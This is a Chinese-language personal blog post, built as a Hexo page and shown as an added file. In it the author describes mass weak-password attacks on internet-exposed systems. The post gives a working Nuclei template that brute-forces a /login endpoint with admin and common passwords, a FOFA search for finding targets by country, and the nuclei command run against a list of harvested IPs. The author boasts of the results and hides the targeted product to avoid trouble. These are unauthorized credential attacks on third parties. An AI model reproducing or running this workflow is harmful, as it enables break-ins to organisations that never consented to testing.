@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="事情的起因是最近又开始内耗了，且找不到症结 然后这段时间某人又开始觉得自己菜了，无能狂怒的某人决定证明一下自己 刚巧意外的遇到了一个有趣的思路，想了想好久没更新博客了值得一写 再加上小伙伴的辛勤催更，终于这篇笔记诞生了，感谢。 锁定目标我的主要工作并不是渗透测试，所以想干点什么只能自己找自己学 寻找资产肯定离不开测绘工具，fofa和hunter，借助它们可以轻松搜罗自己想要的目标 那么，我们有一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神器nuclei与活学活用">
+<meta property="og:url" content="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/index.html">
+<meta property="og:site_name" content="各种write up">
+<meta property="og:description" content="事情的起因是最近又开始内耗了，且找不到症结 然后这段时间某人又开始觉得自己菜了，无能狂怒的某人决定证明一下自己 刚巧意外的遇到了一个有趣的思路，想了想好久没更新博客了值得一写 再加上小伙伴的辛勤催更，终于这篇笔记诞生了，感谢。 锁定目标我的主要工作并不是渗透测试，所以想干点什么只能自己找自己学 寻找资产肯定离不开测绘工具，fofa和hunter，借助它们可以轻松搜罗自己想要的目标 那么，我们有一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/1.png">
+<meta property="og:image" content="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/2.png">
+<meta property="article:published_time" content="2024-03-08T06:09:06.000Z">
+<meta property="article:modified_time" content="2024-03-08T09:21:00.870Z">
+<meta property="article:author" content="Reigniting">
+<meta property="article:tag" content="渗透笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/1.png">
+
+<link rel="canonical" href="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>神器nuclei与活学活用 | 各种write up</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">各种write up</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>links</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Reigniting">
+      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种write up">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          神器nuclei与活学活用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-08 14:09:06 / 修改时间：17:21:00" itemprop="dateCreated datePublished" datetime="2024-03-08T14:09:06+08:00">2024-03-08</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>事情的起因是最近又开始内耗了，且找不到症结</p>
+<p>然后这段时间某人又开始觉得自己菜了，无能狂怒的某人决定证明一下自己</p>
+<p>刚巧意外的遇到了一个有趣的思路，想了想好久没更新博客了值得一写</p>
+<p>再加上小伙伴的辛勤催更，终于这篇笔记诞生了，感谢。</p>
+<h2 id="锁定目标"><a href="#锁定目标" class="headerlink" title="锁定目标"></a>锁定目标</h2><p>我的主要工作并不是渗透测试，所以想干点什么只能自己找自己学</p>
+<p>寻找资产肯定离不开测绘工具，fofa和hunter，借助它们可以轻松搜罗自己想要的目标</p>
+<p>那么，我们有一个摆在眼前的关键任务，该怎么找目标？找什么样的目标？</p>
+<span id="more"></span>
+
+<p>渗透往往都是从已知的部分下手，比较经典的有各种OA系统，或者各个cms爆出来的Nday、1day等等</p>
+<blockquote>
+<p>之前有个学员，安排工作去上班了，客户被勒索了向我求助，系统用的是某家的财务系统，现在的黑产利用思路也在实时更新，那些商业软件的漏洞也是黑客们利用的对象。那既然已经被全网利用那么多轮，各家企业肯定也涨了记性，不放在公网或者修修补补添置安全设备。为了避免麻烦提升产出，就不从这里出发了。</p>
+</blockquote>
+<p>再或者，拿一套源码直接派大哥现场审0day</p>
+<blockquote>
+<p>但我不是那种大哥，代码水平差劲的很，遂放弃（此处诚邀大哥们带我学习）</p>
+</blockquote>
+<p>剩余的就是弱口令之神的战场了，钓鱼的可能性不是很高暂且不讨论</p>
+<blockquote>
+<p><strong>接下来，我们就要寻找一个理想的目标了：大规模的被使用、有源码、弱口令出现概率大、安全意识有待提升、不怎么注重网络安全的资产与服务。</strong></p>
+</blockquote>
+<p>那上哪儿去这么找天大的好东西呢？</p>
+<p>（此处放一只小狗头）</p>
+<h2 id="Nuclei脚本与利用"><a href="#Nuclei脚本与利用" class="headerlink" title="Nuclei脚本与利用"></a>Nuclei脚本与利用</h2><p>这玩意儿太好用了真的，你可以什么都不会，但你必须学会写Nuclei利用jio本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">id: 666</span><br><span class="line"></span><br><span class="line">http:</span><br><span class="line">  - raw:</span><br><span class="line">      - |</span><br><span class="line">        POST /login HTTP/1.1</span><br><span class="line">        Host:&#123;&#123;Hostname&#125;&#125;</span><br><span class="line">        Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">        username=&#123;&#123;username&#125;&#125;&amp;password=&#123;&#123;password&#125;&#125;</span><br><span class="line"></span><br><span class="line">    attack: clusterbomb</span><br><span class="line">    payloads:</span><br><span class="line">      username:</span><br><span class="line">        - admin</span><br><span class="line">      password:</span><br><span class="line">        - 123456</span><br><span class="line">        - admin</span><br><span class="line">        - admin123</span><br><span class="line">        - admin@123</span><br><span class="line">    stop-at-first-match: true</span><br><span class="line"></span><br><span class="line">    matchers-condition: and</span><br><span class="line">    matchers:</span><br><span class="line">      - type: word</span><br><span class="line">        words:</span><br><span class="line">          - &#x27;&quot;success&quot;:true&#x27;</span><br><span class="line">        condition: and</span><br><span class="line">      - type: status</span><br><span class="line">        status:</span><br><span class="line">          - 200</span><br></pre></td></tr></table></figure>
+
+<p>隐去了一些内容，为了避免不必要的麻烦哈哈哈 感兴趣的可以单独跟我聊</p>
+<p>比较简单，没有什么难度，重点在于到底拿什么系统开了刀（滑稽</p>
+<p>接下来上一下FOFA-view</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fid=&quot;?????&quot; &amp;&amp; country=&quot;您随意&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据找到的系统的指纹用测绘去搜就行了</p>
+<p><img src="/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/1.png"></p>
+<p>抛砖引玉，随便限制了几个地区，范围相当之广。我们就随便试试看好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -l ip.txt  -t 666.yaml -o results.txt  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/03/08/%E7%A5%9E%E5%99%A8nuclei%E4%B8%8E%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8/2.png"></p>
+<p>太爽了，太爽了，指哪儿打哪儿，这玩儿意真厉害。就是不知道Nucle支持不支持被动扫描，我没找着</p>
+<p>感觉自己这篇文章比较水，毕竟思路蛮简单的，重点在于你的目标是什么。</p>
+<p>但只要方向不出错，利用起来越简单，杀伤力就越大。（就好比此次渗透，自我感觉成果惊人）</p>
+<p>这下破案了，内耗就是没搞渗透导致的，以后定期开展老年复健运动</p>
+<hr>
+<blockquote>
+<p>泉眼无声惜细流，树阴照水爱晴柔，小荷才露尖尖角，早有蜻蜓立上头</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">本文结束，感谢您的阅读<span class="post-meta-divider">|</span>看到这里的师傅博主非常感谢</div>
+    
+</div>
+  
+</div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 渗透笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/18/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E2%86%92%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%86%92RottenPotato%E6%8F%90%E6%9D%83/" rel="prev" title="信息泄露→文件上传→RottenPotato提权">
+      <i class="fa fa-chevron-left"></i> 信息泄露→文件上传→RottenPotato提权
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%81%E5%AE%9A%E7%9B%AE%E6%A0%87"><span class="nav-number">1.</span> <span class="nav-text">锁定目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nuclei%E8%84%9A%E6%9C%AC%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">Nuclei脚本与利用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Reigniting"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Reigniting</p>
+  <div class="site-description" itemprop="description">对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Reigniting</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">63k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">57 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.7' zIndex='-2' count='110' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false,"scale":0.5},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
